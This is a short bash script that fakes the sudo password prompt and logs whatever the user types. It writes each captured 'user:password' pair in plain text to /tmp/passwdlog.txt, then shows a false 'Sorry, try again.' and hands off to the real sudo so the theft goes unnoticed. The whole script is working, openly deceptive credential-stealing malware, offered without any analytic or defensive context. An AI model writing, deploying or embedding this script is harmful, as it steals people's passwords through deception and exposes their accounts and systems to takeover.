#!/bin/bash

PASSLOG="/tmp/passwdlog.txt"

if [ "$EUID" -ne 0 ]; then
    read -s -p "[sudo] password for $(whoami): " passw  # Fake a sudo prompt.
    echo ""
    sleep 2
    echo "Sorry, try again."
    echo "$(whoami):$passw" >> $PASSLOG
else
    read -s -p "[sudo] password for $SUDO_USER: " passw # Already running as root but let's fake em out anyway.
    echo ""
    echo "$SUDO_USER:$passw" >> $PASSLOG
fi

/usr/bin/sudo $@ # Run requested command
